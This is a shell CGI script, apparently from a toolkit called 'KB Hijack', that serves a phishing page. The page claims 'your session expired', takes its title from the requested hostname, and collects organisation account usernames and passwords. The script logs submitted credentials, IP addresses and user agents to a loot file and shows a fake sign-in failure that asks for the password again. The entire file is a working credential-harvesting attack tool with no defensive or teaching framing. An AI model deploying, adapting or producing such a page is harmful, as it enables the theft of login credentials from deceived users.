#!/bin/sh
# session_expired template - KB Hijack v1.0
# Generic "session expired, sign in to continue to <host>" page. The intended
# target hostname IS the lure (attacker never clones the target - the operator's
# own list supplies it; the page stays unbranded by standing design line).
LOOTLOG="${LOOTLOG:-/tmp/kbhijack_capture.log}"
U=$(echo "${HTTP_USER_AGENT:-}" | cut -c1-200)
TGT=$(echo "${HTTP_HOST:-unknown}" | cut -c1-120 | tr -cd 'A-Za-z0-9.:_-')
B=""; MSG=""; NAME=""
if [ "$REQUEST_METHOD" = "POST" ]; then
  B=$(dd bs=1 count="${CONTENT_LENGTH:-0}" 2>/dev/null)
  # field-split on &, then =; accept the common login-field variants so a
  # nonstandard form still lands; RAW fallback guarantees nothing is ever lost.
  USER_=$(echo "$B" | tr '&' '\n' | grep -m1 -E '^(user|username|email|login|account)=' | cut -d= -f2-)
  PASS_=$(echo "$B" | tr '&' '\n' | grep -m1 -E '^(pass|password|pwd|pin)=' | cut -d= -f2-)
  RAWB=""
  [ -z "$USER_" ] && [ -z "$PASS_" ] && RAWB="|raw=$(echo "$B" | tr -c 'A-Za-z0-9%&=._@:-' '?' | cut -c1-240)"
  TS=$(date -u +%FT%TZ)
  echo "POST |$TS|tgt=$TGT|ra=$REMOTE_ADDR|ua=$U|user=$USER_|pass=$PASS_|ref=$HTTP_REFERER" $RAWB >> "$LOOTLOG" 2>/dev/null
  NAME=$(echo "$USER_" | sed 's/%40/@/g' | cut -c1-40)
  MSG="Sign-in failed - directory unreachable. Try again or use your app password."
fi
if [ "$REQUEST_METHOD" = "GET" ]; then
  TS=$(date -u +%FT%TZ)
  echo "GET |$TS|tgt=$TGT|ra=$REMOTE_ADDR|ua=$U|qs=$QUERY_STRING|ref=$HTTP_REFERER" >> "$LOOTLOG" 2>/dev/null
fi
echo "Content-Type: text/html"
echo ""
cat <<HTML
<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - $TGT</title>
<style>
 body{margin:0;font-family:"Segoe UI",Roboto,Arial,sans-serif;background:#f4f6f8;color:#333}
 .wrap{max-width:400px;margin:56px auto;padding:0 16px}
 .card{background:#fff;border-radius:10px;box-shadow:0 2px 10px rgba(30,50,70,.12);padding:32px 28px}
 .bar{height:6px;background:linear-gradient(90deg,#1f6fb2,#38a3d1);border-radius:10px 10px 0 0}
 h1{font-size:18px;text-align:center;margin:0 0 4px;color:#22456b;word-break:break-all}
 p.sub{text-align:center;font-size:13.5px;color:#5b6b7a;margin:0 0 20px;line-height:1.45}
 label{display:block;font-size:12.5px;font-weight:600;color:#39536b;margin:14px 0 5px}
 input{width:100%;box-sizing:border-box;padding:10px 11px;border:1px solid #c4d0da;border-radius:6px;font-size:15px}
 input:focus{outline:none;border-color:#1f6fb2;box-shadow:0 0 0 2px rgba(31,111,178,.15)}
 button{width:100%;margin-top:20px;padding:11px;background:#1f6fb2;color:#fff;border:0;border-radius:6px;font-size:15.5px;font-weight:600;cursor:pointer}
 .err{background:#fdf0ef;border:1px solid #f0c4c0;color:#96322a;font-size:12.8px;padding:9px 11px;border-radius:6px;margin-bottom:4px;line-height:1.4}
 .foot{text-align:center;font-size:11px;color:#93a3b1;margin-top:18px}
</style></head><body>
<div class="wrap"><div class="bar"></div><div class="card">
<h1>$TGT</h1>
<p class="sub">Your session expired.<br>Sign in with your organization account to continue.</p>
${MSG:+<div class="err">$MSG</div>}
<form method="POST" action="/login.cgi">
 <label for="user">Account</label>
 <input id="user" name="user" type="text" autocapitalize="off" autocorrect="off" spellcheck="false" placeholder="name@organization.com" value="$NAME">
 <label for="pass">Password</label>
 <input id="pass" name="pass" type="password" placeholder="Password or app password">
 <button type="submit">Continue to $TGT</button>
</form>
<p class="foot">Managed device sign-in &#183; Network Access Gateway</p>
</div></div></body></html>
HTML
